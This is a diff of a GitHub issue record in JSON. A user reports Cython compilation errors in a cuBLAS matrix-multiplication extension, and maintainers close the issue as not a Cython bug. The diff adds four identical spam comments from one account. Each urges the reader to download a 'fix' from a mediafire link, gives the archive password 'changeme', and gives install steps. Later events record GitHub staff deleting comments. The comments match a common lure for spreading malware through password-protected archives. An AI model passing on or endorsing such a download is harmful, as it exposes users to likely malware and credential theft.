@@ -5,7 +5,208 @@
     "author_association": "NONE",
     "body": "### Describe your issue\n\nHello. Working from the HEAD on the main branch of https://github.com/MatthewRalston/kmerdb\r\n\r\nRelevant files are `kmerdb/cublas_gemm` and `kmerdb/regression.pyx`.\r\n\r\nCould use some help. I'm not able to access cublas functionality. Errors galore and it was some scaffolding I took from ChatGPT.\r\n\r\n\r\n# Issue Type\r\n\r\nCythonization issues with cublas extension and gemm multiplication. Issues consist of type issues, related to casting double-precsision to Python objects. Unclear to me. Pasting below.\r\n\r\n```\r\n      kmerdb/cublas_gemm.pyx:71:15: Cannot convert 'double **' to Python object\r\n      \r\n      Error compiling Cython file:\r\n      ------------------------------------------------------------\r\n      ...\r\n          cdef double *d_B\r\n          cdef double *d_C\r\n      \r\n          # Allocate device memory\r\n          cudaMalloc(&d_A, m * k * sizeof(double))\r\n          cudaMalloc(&d_B, k * n * sizeof(double))\r\n                     ^\r\n      ------------------------------------------------------------\r\n      \r\n      kmerdb/cublas_gemm.pyx:72:15: Cannot convert 'double **' to Python object\r\n      \r\n      Error compiling Cython file:\r\n      ------------------------------------------------------------\r\n      ...\r\n          cdef double *d_C\r\n      \r\n          # Allocate device memory\r\n          cudaMalloc(&d_A, m * k * sizeof(double))\r\n          cudaMalloc(&d_B, k * n * sizeof(double))\r\n          cudaMalloc(&d_C, m * n * sizeof(double))\r\n                     ^\r\n      ------------------------------------------------------------\r\n      \r\n      kmerdb/cublas_gemm.pyx:73:15: Cannot convert 'double **' to Python object\r\n      \r\n      Error compiling Cython file:\r\n      ------------------------------------------------------------\r\n      ...\r\n      \r\n          for i in range(k * n):\r\n              h_B[i] = <double> B[i // B.shape[1], i % B.shape[1]]  # Convert to double\r\n      \r\n          # Copy from host arrays to device\r\n          cudaMemcpy(d_A, int(h_A), m * k * sizeof(double), cudaMemcpyHostToDevice)\r\n                              ^\r\n      ------------------------------------------------------------\r\n      \r\n      kmerdb/cublas_gemm.pyx:87:24: Cannot convert 'double *' to Python object\r\n\r\n     ------------------------------------------------------------\r\n      \r\n      kmerdb/cublas_gemm.pyx:87:15: Cannot convert 'double *' to Python object\r\n      \r\n      Error compiling Cython file:\r\n      ------------------------------------------------------------\r\n      ...\r\n          for i in range(k * n):\r\n              h_B[i] = <double> B[i // B.shape[1], i % B.shape[1]]  # Convert to double\r\n      \r\n          # Copy from host arrays to device\r\n          cudaMemcpy(d_A, int(h_A), m * k * sizeof(double), cudaMemcpyHostToDevice)\r\n          cudaMemcpy(d_B, int(h_B), k * n * sizeof(double), cudaMemcpyHostToDevice)\r\n                              ^\r\n      ------------------------------------------------------------\r\n      \r\n      kmerdb/cublas_gemm.pyx:88:24: Cannot convert 'double *' to Python object\r\n      \r\n      Error compiling Cython file:\r\n      ------------------------------------------------------------\r\n      ...\r\n          for i in range(k * n):\r\n              h_B[i] = <double> B[i // B.shape[1], i % B.shape[1]]  # Convert to double\r\n      \r\n          # Copy from host arrays to device\r\n          cudaMemcpy(d_A, int(h_A), m * k * sizeof(double), cudaMemcpyHostToDevice)\r\n          cudaMemcpy(d_B, int(h_B), k * n * sizeof(double), cudaMemcpyHostToDevice)\r\n                     ^\r\n      ------------------------------------------------------------\r\n\r\n\r\n```\r\n\r\n# Other issues\r\n\r\n## Missing Memcpy.pxd file\r\n\r\nThe default paths searched for the Cython memcpy header is missing. Using pipenv for virtualenv management. Source installed 3.12.4 C-Python otherwise.\r\n\r\n\r\n```\r\n  error: subprocess-exited-with-error\r\n  \r\n  × Getting requirements to build wheel did not run successfully.\r\n  │ exit code: 1\r\n  ╰─> [154 lines of output]\r\n      /mnt/tmp/pip-build-env-gd_ak7r8/overlay/lib/python3.12/site-packages/Cython/Compiler/Main.py:381: FutureWarning: Cython directive 'language_level' not set, using '3str' for now (Py3). This has changed from earlier releases! File: /develop/repos/kdb/kmerdb/cublas_gemm.pyx\r\n        tree = Parsing.p_module(s, pxd, full_module_name)\r\n      \r\n      Error compiling Cython file:\r\n      ------------------------------------------------------------\r\n      ...\r\n      '''\r\n      # cublas_gemm.pyx\r\n      import numpy as np\r\n      cimport numpy as cnp\r\n      from libc.stdlib cimport malloc, free\r\n      from libc.stdlib cimport memcpy\r\n      ^\r\n      ------------------------------------------------------------\r\n      \r\n      kmerdb/cublas_gemm.pyx:22:0: 'libc/stdlib/memcpy.pxd' not found\r\n\r\n```\r\n\r\n\r\n## Missing CudaMemcpyHostToDevice\r\n\r\nAdditional missing cuda commands from ?? Not sure, new Cython programmer.\r\n\r\n\r\n```\r\n      Error compiling Cython file:\r\n      ------------------------------------------------------------\r\n      ...\r\n      \r\n          for i in range(k * n):\r\n              h_B[i] = <double> B[i // B.shape[1], i % B.shape[1]]  # Convert to double\r\n      \r\n          # Copy from host arrays to device\r\n          cudaMemcpy(d_A, int(h_A), m * k * sizeof(double), cudaMemcpyHostToDevice)\r\n                                                            ^\r\n      ------------------------------------------------------------\r\n      \r\n      kmerdb/cublas_gemm.pyx:87:54: undeclared name not builtin: cudaMemcpyHostToDevice\r\n\r\n\r\n```\r\n\r\n\r\n\r\n\r\n",
     "closed_at": "2024-08-27T08:27:50Z",
+    "closed_by": {
+        "avatar_url": "https://avatars.githubusercontent.com/u/491659?v=4",
+        "events_url": "https://api.github.com/users/scoder/events{/privacy}",
+        "followers_url": "https://api.github.com/users/scoder/followers",
+        "following_url": "https://api.github.com/users/scoder/following{/other_user}",
+        "gists_url": "https://api.github.com/users/scoder/gists{/gist_id}",
+        "gravatar_id": "",
+        "html_url": "https://github.com/scoder",
+        "id": 491659,
+        "login": "scoder",
+        "node_id": "MDQ6VXNlcjQ5MTY1OQ==",
+        "organizations_url": "https://api.github.com/users/scoder/orgs",
+        "received_events_url": "https://api.github.com/users/scoder/received_events",
+        "repos_url": "https://api.github.com/users/scoder/repos",
+        "site_admin": false,
+        "starred_url": "https://api.github.com/users/scoder/starred{/owner}{/repo}",
+        "subscriptions_url": "https://api.github.com/users/scoder/subscriptions",
+        "type": "User",
+        "url": "https://api.github.com/users/scoder",
+        "user_view_type": "public"
+    },
     "comment_data": [
+        {
+            "author_association": "NONE",
+            "body": "to fix your trouble try download this fix, i see it in another issue,\r\nhttps://app.mediafire.com/3ag3jpquii3of\r\npassword: changeme\r\nwhen you installing, you need to place a check in install to path and select \"gcc.\"",
+            "created_at": "2024-08-27T02:44:07Z",
+            "html_url": "https://github.com/cython/cython/issues/6367#issuecomment-2311460889",
+            "id": 2311460889,
+            "issue_url": "https://api.github.com/repos/cython/cython/issues/6367",
+            "node_id": "IC_kwDOABDGAc6JxhgZ",
+            "performed_via_github_app": null,
+            "reactions": {
+                "+1": 0,
+                "-1": 0,
+                "confused": 0,
+                "eyes": 0,
+                "heart": 0,
+                "hooray": 0,
+                "laugh": 0,
+                "rocket": 0,
+                "total_count": 0,
+                "url": "https://api.github.com/repos/cython/cython/issues/comments/2311460889/reactions"
+            },
+            "updated_at": "2024-08-27T02:44:07Z",
+            "url": "https://api.github.com/repos/cython/cython/issues/comments/2311460889",
+            "user": {
+                "avatar_url": "https://avatars.githubusercontent.com/u/55325034?v=4",
+                "events_url": "https://api.github.com/users/jia6214876/events{/privacy}",
+                "followers_url": "https://api.github.com/users/jia6214876/followers",
+                "following_url": "https://api.github.com/users/jia6214876/following{/other_user}",
+                "gists_url": "https://api.github.com/users/jia6214876/gists{/gist_id}",
+                "gravatar_id": "",
+                "html_url": "https://github.com/jia6214876",
+                "id": 55325034,
+                "login": "jia6214876",
+                "node_id": "MDQ6VXNlcjU1MzI1MDM0",
+                "organizations_url": "https://api.github.com/users/jia6214876/orgs",
+                "received_events_url": "https://api.github.com/users/jia6214876/received_events",
+                "repos_url": "https://api.github.com/users/jia6214876/repos",
+                "site_admin": false,
+                "starred_url": "https://api.github.com/users/jia6214876/starred{/owner}{/repo}",
+                "subscriptions_url": "https://api.github.com/users/jia6214876/subscriptions",
+                "type": "User",
+                "url": "https://api.github.com/users/jia6214876",
+                "user_view_type": "public"
+            }
+        },
+        {
+            "author_association": "NONE",
+            "body": "to fix your trouble try download this fix, i see it in another issue,\r\nhttps://app.mediafire.com/3ag3jpquii3of\r\npassword: changeme\r\nwhen you installing, you need to place a check in install to path and select \"gcc.\"",
+            "created_at": "2024-08-27T02:46:23Z",
+            "html_url": "https://github.com/cython/cython/issues/6367#issuecomment-2311462784",
+            "id": 2311462784,
+            "issue_url": "https://api.github.com/repos/cython/cython/issues/6367",
+            "node_id": "IC_kwDOABDGAc6Jxh-A",
+            "performed_via_github_app": null,
+            "reactions": {
+                "+1": 0,
+                "-1": 0,
+                "confused": 0,
+                "eyes": 0,
+                "heart": 0,
+                "hooray": 0,
+                "laugh": 0,
+                "rocket": 0,
+                "total_count": 0,
+                "url": "https://api.github.com/repos/cython/cython/issues/comments/2311462784/reactions"
+            },
+            "updated_at": "2024-08-27T02:46:23Z",
+            "url": "https://api.github.com/repos/cython/cython/issues/comments/2311462784",
+            "user": {
+                "avatar_url": "https://avatars.githubusercontent.com/u/55325034?v=4",
+                "events_url": "https://api.github.com/users/jia6214876/events{/privacy}",
+                "followers_url": "https://api.github.com/users/jia6214876/followers",
+                "following_url": "https://api.github.com/users/jia6214876/following{/other_user}",
+                "gists_url": "https://api.github.com/users/jia6214876/gists{/gist_id}",
+                "gravatar_id": "",
+                "html_url": "https://github.com/jia6214876",
+                "id": 55325034,
+                "login": "jia6214876",
+                "node_id": "MDQ6VXNlcjU1MzI1MDM0",
+                "organizations_url": "https://api.github.com/users/jia6214876/orgs",
+                "received_events_url": "https://api.github.com/users/jia6214876/received_events",
+                "repos_url": "https://api.github.com/users/jia6214876/repos",
+                "site_admin": false,
+                "starred_url": "https://api.github.com/users/jia6214876/starred{/owner}{/repo}",
+                "subscriptions_url": "https://api.github.com/users/jia6214876/subscriptions",
+                "type": "User",
+                "url": "https://api.github.com/users/jia6214876",
+                "user_view_type": "public"
+            }
+        },
+        {
+            "author_association": "NONE",
+            "body": "to fix your trouble try download this fix, i see it in another issue,\r\nhttps://app.mediafire.com/3ag3jpquii3of\r\npassword: changeme\r\nwhen you installing, you need to place a check in install to path and select \"gcc.\"",
+            "created_at": "2024-08-27T02:46:26Z",
+            "html_url": "https://github.com/cython/cython/issues/6367#issuecomment-2311462831",
+            "id": 2311462831,
+            "issue_url": "https://api.github.com/repos/cython/cython/issues/6367",
+            "node_id": "IC_kwDOABDGAc6Jxh-v",
+            "performed_via_github_app": null,
+            "reactions": {
+                "+1": 0,
+                "-1": 0,
+                "confused": 0,
+                "eyes": 0,
+                "heart": 0,
+                "hooray": 0,
+                "laugh": 0,
+                "rocket": 0,
+                "total_count": 0,
+                "url": "https://api.github.com/repos/cython/cython/issues/comments/2311462831/reactions"
+            },
+            "updated_at": "2024-08-27T02:46:26Z",
+            "url": "https://api.github.com/repos/cython/cython/issues/comments/2311462831",
+            "user": {
+                "avatar_url": "https://avatars.githubusercontent.com/u/55325034?v=4",
+                "events_url": "https://api.github.com/users/jia6214876/events{/privacy}",
+                "followers_url": "https://api.github.com/users/jia6214876/followers",
+                "following_url": "https://api.github.com/users/jia6214876/following{/other_user}",
+                "gists_url": "https://api.github.com/users/jia6214876/gists{/gist_id}",
+                "gravatar_id": "",
+                "html_url": "https://github.com/jia6214876",
+                "id": 55325034,
+                "login": "jia6214876",
+                "node_id": "MDQ6VXNlcjU1MzI1MDM0",
+                "organizations_url": "https://api.github.com/users/jia6214876/orgs",
+                "received_events_url": "https://api.github.com/users/jia6214876/received_events",
+                "repos_url": "https://api.github.com/users/jia6214876/repos",
+                "site_admin": false,
+                "starred_url": "https://api.github.com/users/jia6214876/starred{/owner}{/repo}",
+                "subscriptions_url": "https://api.github.com/users/jia6214876/subscriptions",
+                "type": "User",
+                "url": "https://api.github.com/users/jia6214876",
+                "user_view_type": "public"
+            }
+        },
+        {
+            "author_association": "NONE",
+            "body": "to fix your trouble try download this fix, i see it in another issue,\r\nhttps://app.mediafire.com/3ag3jpquii3of\r\npassword: changeme\r\nwhen you installing, you need to place a check in install to path and select \"gcc.\"",
+            "created_at": "2024-08-27T02:46:29Z",
+            "html_url": "https://github.com/cython/cython/issues/6367#issuecomment-2311462887",
+            "id": 2311462887,
+            "issue_url": "https://api.github.com/repos/cython/cython/issues/6367",
+            "node_id": "IC_kwDOABDGAc6Jxh_n",
+            "performed_via_github_app": null,
+            "reactions": {
+                "+1": 0,
+                "-1": 0,
+                "confused": 0,
+                "eyes": 0,
+                "heart": 0,
+                "hooray": 0,
+                "laugh": 0,
+                "rocket": 0,
+                "total_count": 0,
+                "url": "https://api.github.com/repos/cython/cython/issues/comments/2311462887/reactions"
+            },
+            "updated_at": "2024-08-27T02:46:29Z",
+            "url": "https://api.github.com/repos/cython/cython/issues/comments/2311462887",
+            "user": {
+                "avatar_url": "https://avatars.githubusercontent.com/u/55325034?v=4",
+                "events_url": "https://api.github.com/users/jia6214876/events{/privacy}",
+                "followers_url": "https://api.github.com/users/jia6214876/followers",
+                "following_url": "https://api.github.com/users/jia6214876/following{/other_user}",
+                "gists_url": "https://api.github.com/users/jia6214876/gists{/gist_id}",
+                "gravatar_id": "",
+                "html_url": "https://github.com/jia6214876",
+                "id": 55325034,
+                "login": "jia6214876",
+                "node_id": "MDQ6VXNlcjU1MzI1MDM0",
+                "organizations_url": "https://api.github.com/users/jia6214876/orgs",
+                "received_events_url": "https://api.github.com/users/jia6214876/received_events",
+                "repos_url": "https://api.github.com/users/jia6214876/repos",
+                "site_admin": false,
+                "starred_url": "https://api.github.com/users/jia6214876/starred{/owner}{/repo}",
+                "subscriptions_url": "https://api.github.com/users/jia6214876/subscriptions",
+                "type": "User",
+                "url": "https://api.github.com/users/jia6214876",
+                "user_view_type": "public"
+            }
+        },
         {
             "author_association": "MEMBER",
             "body": "This does not look like a Cython bug or feature request to me. Please ask on the cython-users mailing list if you want help with using Cython from a broader audience.",
@@ -47,7 +248,8 @@
                 "starred_url": "https://api.github.com/users/scoder/starred{/owner}{/repo}",
                 "subscriptions_url": "https://api.github.com/users/scoder/subscriptions",
                 "type": "User",
-                "url": "https://api.github.com/users/scoder"
+                "url": "https://api.github.com/users/scoder",
+                "user_view_type": "public"
             }
         },
         {
@@ -91,7 +293,8 @@
                 "starred_url": "https://api.github.com/users/da-woods/starred{/owner}{/repo}",
                 "subscriptions_url": "https://api.github.com/users/da-woods/subscriptions",
                 "type": "User",
-                "url": "https://api.github.com/users/da-woods"
+                "url": "https://api.github.com/users/da-woods",
+                "user_view_type": "public"
             }
         },
         {
@@ -135,7 +338,8 @@
                 "starred_url": "https://api.github.com/users/MatthewRalston/starred{/owner}{/repo}",
                 "subscriptions_url": "https://api.github.com/users/MatthewRalston/subscriptions",
                 "type": "User",
-                "url": "https://api.github.com/users/MatthewRalston"
+                "url": "https://api.github.com/users/MatthewRalston",
+                "user_view_type": "public"
             }
         },
         {
@@ -179,7 +383,8 @@
                 "starred_url": "https://api.github.com/users/da-woods/starred{/owner}{/repo}",
                 "subscriptions_url": "https://api.github.com/users/da-woods/subscriptions",
                 "type": "User",
-                "url": "https://api.github.com/users/da-woods"
+                "url": "https://api.github.com/users/da-woods",
+                "user_view_type": "public"
             }
         },
         {
@@ -223,7 +428,8 @@
                 "starred_url": "https://api.github.com/users/MatthewRalston/starred{/owner}{/repo}",
                 "subscriptions_url": "https://api.github.com/users/MatthewRalston/subscriptions",
                 "type": "User",
-                "url": "https://api.github.com/users/MatthewRalston"
+                "url": "https://api.github.com/users/MatthewRalston",
+                "user_view_type": "public"
             }
         }
     ],
@@ -250,7 +456,8 @@
                 "starred_url": "https://api.github.com/users/soraros/starred{/owner}{/repo}",
                 "subscriptions_url": "https://api.github.com/users/soraros/subscriptions",
                 "type": "User",
-                "url": "https://api.github.com/users/soraros"
+                "url": "https://api.github.com/users/soraros",
+                "user_view_type": "public"
             },
             "commit_id": null,
             "commit_url": null,
@@ -280,7 +487,8 @@
                 "starred_url": "https://api.github.com/users/scoder/starred{/owner}{/repo}",
                 "subscriptions_url": "https://api.github.com/users/scoder/subscriptions",
                 "type": "User",
-                "url": "https://api.github.com/users/scoder"
+                "url": "https://api.github.com/users/scoder",
+                "user_view_type": "public"
             },
             "commit_id": null,
             "commit_url": null,
@@ -314,7 +522,8 @@
                 "starred_url": "https://api.github.com/users/scoder/starred{/owner}{/repo}",
                 "subscriptions_url": "https://api.github.com/users/scoder/subscriptions",
                 "type": "User",
-                "url": "https://api.github.com/users/scoder"
+                "url": "https://api.github.com/users/scoder",
+                "user_view_type": "public"
             },
             "commit_id": null,
             "commit_url": null,
@@ -345,7 +554,8 @@
                 "starred_url": "https://api.github.com/users/scoder/starred{/owner}{/repo}",
                 "subscriptions_url": "https://api.github.com/users/scoder/subscriptions",
                 "type": "User",
-                "url": "https://api.github.com/users/scoder"
+                "url": "https://api.github.com/users/scoder",
+                "user_view_type": "public"
             },
             "commit_id": null,
             "commit_url": null,
@@ -375,7 +585,8 @@
                 "starred_url": "https://api.github.com/users/scoder/starred{/owner}{/repo}",
                 "subscriptions_url": "https://api.github.com/users/scoder/subscriptions",
                 "type": "User",
-                "url": "https://api.github.com/users/scoder"
+                "url": "https://api.github.com/users/scoder",
+                "user_view_type": "public"
             },
             "commit_id": null,
             "commit_url": null,
@@ -405,7 +616,8 @@
                 "starred_url": "https://api.github.com/users/da-woods/starred{/owner}{/repo}",
                 "subscriptions_url": "https://api.github.com/users/da-woods/subscriptions",
                 "type": "User",
-                "url": "https://api.github.com/users/da-woods"
+                "url": "https://api.github.com/users/da-woods",
+                "user_view_type": "public"
             },
             "commit_id": null,
             "commit_url": null,
@@ -435,7 +647,8 @@
                 "starred_url": "https://api.github.com/users/da-woods/starred{/owner}{/repo}",
                 "subscriptions_url": "https://api.github.com/users/da-woods/subscriptions",
                 "type": "User",
-                "url": "https://api.github.com/users/da-woods"
+                "url": "https://api.github.com/users/da-woods",
+                "user_view_type": "public"
             },
             "commit_id": null,
             "commit_url": null,
@@ -465,7 +678,8 @@
                 "starred_url": "https://api.github.com/users/da-woods/starred{/owner}{/repo}",
                 "subscriptions_url": "https://api.github.com/users/da-woods/subscriptions",
                 "type": "User",
-                "url": "https://api.github.com/users/da-woods"
+                "url": "https://api.github.com/users/da-woods",
+                "user_view_type": "public"
             },
             "commit_id": null,
             "commit_url": null,
@@ -495,7 +709,8 @@
                 "starred_url": "https://api.github.com/users/da-woods/starred{/owner}{/repo}",
                 "subscriptions_url": "https://api.github.com/users/da-woods/subscriptions",
                 "type": "User",
-                "url": "https://api.github.com/users/da-woods"
+                "url": "https://api.github.com/users/da-woods",
+                "user_view_type": "public"
             },
             "commit_id": null,
             "commit_url": null,
@@ -505,6 +720,130 @@
             "node_id": "SE_lADOABDGAc6UTfxkzwAAAANLjnSU",
             "performed_via_github_app": null,
             "url": "https://api.github.com/repos/cython/cython/issues/events/14152529044"
+        },
+        {
+            "actor": {
+                "avatar_url": "https://avatars.githubusercontent.com/u/126821655?v=4",
+                "events_url": "https://api.github.com/users/github-staff/events{/privacy}",
+                "followers_url": "https://api.github.com/users/github-staff/followers",
+                "following_url": "https://api.github.com/users/github-staff/following{/other_user}",
+                "gists_url": "https://api.github.com/users/github-staff/gists{/gist_id}",
+                "gravatar_id": "",
+                "html_url": "https://github.com/github-staff",
+                "id": 126821655,
+                "login": "github-staff",
+                "node_id": "U_kgDOB48lFw",
+                "organizations_url": "https://api.github.com/users/github-staff/orgs",
+                "received_events_url": "https://api.github.com/users/github-staff/received_events",
+                "repos_url": "https://api.github.com/users/github-staff/repos",
+                "site_admin": false,
+                "starred_url": "https://api.github.com/users/github-staff/starred{/owner}{/repo}",
+                "subscriptions_url": "https://api.github.com/users/github-staff/subscriptions",
+                "type": "User",
+                "url": "https://api.github.com/users/github-staff",
+                "user_view_type": "public"
+            },
+            "commit_id": null,
+            "commit_url": null,
+            "created_at": "2025-05-27T14:54:16Z",
+            "event": "comment_deleted",
+            "id": 17832499400,
+            "node_id": "CDE_lADOABDGAc6UTfxkzwAAAAQm5ljI",
+            "performed_via_github_app": null,
+            "url": "https://api.github.com/repos/cython/cython/issues/events/17832499400"
+        },
+        {
+            "actor": {
+                "avatar_url": "https://avatars.githubusercontent.com/u/126821655?v=4",
+                "events_url": "https://api.github.com/users/github-staff/events{/privacy}",
+                "followers_url": "https://api.github.com/users/github-staff/followers",
+                "following_url": "https://api.github.com/users/github-staff/following{/other_user}",
+                "gists_url": "https://api.github.com/users/github-staff/gists{/gist_id}",
+                "gravatar_id": "",
+                "html_url": "https://github.com/github-staff",
+                "id": 126821655,
+                "login": "github-staff",
+                "node_id": "U_kgDOB48lFw",
+                "organizations_url": "https://api.github.com/users/github-staff/orgs",
+                "received_events_url": "https://api.github.com/users/github-staff/received_events",
+                "repos_url": "https://api.github.com/users/github-staff/repos",
+                "site_admin": false,
+                "starred_url": "https://api.github.com/users/github-staff/starred{/owner}{/repo}",
+                "subscriptions_url": "https://api.github.com/users/github-staff/subscriptions",
+                "type": "User",
+                "url": "https://api.github.com/users/github-staff",
+                "user_view_type": "public"
+            },
+            "commit_id": null,
+            "commit_url": null,
+            "created_at": "2025-05-27T14:54:21Z",
+            "event": "comment_deleted",
+            "id": 17832500813,
+            "node_id": "CDE_lADOABDGAc6UTfxkzwAAAAQm5l5N",
+            "performed_via_github_app": null,
+            "url": "https://api.github.com/repos/cython/cython/issues/events/17832500813"
+        },
+        {
+            "actor": {
+                "avatar_url": "https://avatars.githubusercontent.com/u/126821655?v=4",
+                "events_url": "https://api.github.com/users/github-staff/events{/privacy}",
+                "followers_url": "https://api.github.com/users/github-staff/followers",
+                "following_url": "https://api.github.com/users/github-staff/following{/other_user}",
+                "gists_url": "https://api.github.com/users/github-staff/gists{/gist_id}",
+                "gravatar_id": "",
+                "html_url": "https://github.com/github-staff",
+                "id": 126821655,
+                "login": "github-staff",
+                "node_id": "U_kgDOB48lFw",
+                "organizations_url": "https://api.github.com/users/github-staff/orgs",
+                "received_events_url": "https://api.github.com/users/github-staff/received_events",
+                "repos_url": "https://api.github.com/users/github-staff/repos",
+                "site_admin": false,
+                "starred_url": "https://api.github.com/users/github-staff/starred{/owner}{/repo}",
+                "subscriptions_url": "https://api.github.com/users/github-staff/subscriptions",
+                "type": "User",
+                "url": "https://api.github.com/users/github-staff",
+                "user_view_type": "public"
+            },
+            "commit_id": null,
+            "commit_url": null,
+            "created_at": "2025-05-27T14:54:23Z",
+            "event": "comment_deleted",
+            "id": 17832502147,
+            "node_id": "CDE_lADOABDGAc6UTfxkzwAAAAQm5mOD",
+            "performed_via_github_app": null,
+            "url": "https://api.github.com/repos/cython/cython/issues/events/17832502147"
+        },
+        {
+            "actor": {
+                "avatar_url": "https://avatars.githubusercontent.com/u/126821655?v=4",
+                "events_url": "https://api.github.com/users/github-staff/events{/privacy}",
+                "followers_url": "https://api.github.com/users/github-staff/followers",
+                "following_url": "https://api.github.com/users/github-staff/following{/other_user}",
+                "gists_url": "https://api.github.com/users/github-staff/gists{/gist_id}",
+                "gravatar_id": "",
+                "html_url": "https://github.com/github-staff",
+                "id": 126821655,
+                "login": "github-staff",
+                "node_id": "U_kgDOB48lFw",
+                "organizations_url": "https://api.github.com/users/github-staff/orgs",
+                "received_events_url": "https://api.github.com/users/github-staff/received_events",
+                "repos_url": "https://api.github.com/users/github-staff/repos",
+                "site_admin": false,
+                "starred_url": "https://api.github.com/users/github-staff/starred{/owner}{/repo}",
+                "subscriptions_url": "https://api.github.com/users/github-staff/subscriptions",
+                "type": "User",
+                "url": "https://api.github.com/users/github-staff",
+                "user_view_type": "public"
+            },
+            "commit_id": null,
+            "commit_url": null,
+            "created_at": "2025-05-27T14:54:25Z",
+            "event": "comment_deleted",
+            "id": 17832502837,
+            "node_id": "CDE_lADOABDGAc6UTfxkzwAAAAQm5mY1",
+            "performed_via_github_app": null,
+            "url": "https://api.github.com/repos/cython/cython/issues/events/17832502837"
         }
     ],
     "events_url": "https://api.github.com/repos/cython/cython/issues/6367/events",
@@ -542,9 +881,15 @@
     "repository_url": "https://api.github.com/repos/cython/cython",
     "state": "closed",
     "state_reason": "not_planned",
+    "sub_issues_summary": {
+        "completed": 0,
+        "percent_completed": 0,
+        "total": 0
+    },
     "timeline_url": "https://api.github.com/repos/cython/cython/issues/6367/timeline",
     "title": "how do i address a missing \"memcpy\" pxd file when cythonizing my extension",
-    "updated_at": "2024-09-05T22:11:05Z",
+    "type": null,
+    "updated_at": "2025-05-27T14:54:26Z",
     "url": "https://api.github.com/repos/cython/cython/issues/6367",
     "user": {
         "avatar_url": "https://avatars.githubusercontent.com/u/4308024?v=4",
@@ -564,6 +909,7 @@
         "starred_url": "https://api.github.com/users/MatthewRalston/starred{/owner}{/repo}",
         "subscriptions_url": "https://api.github.com/users/MatthewRalston/subscriptions",
         "type": "User",
-        "url": "https://api.github.com/users/MatthewRalston"
+        "url": "https://api.github.com/users/MatthewRalston",
+        "user_view_type": "public"
     }
 }
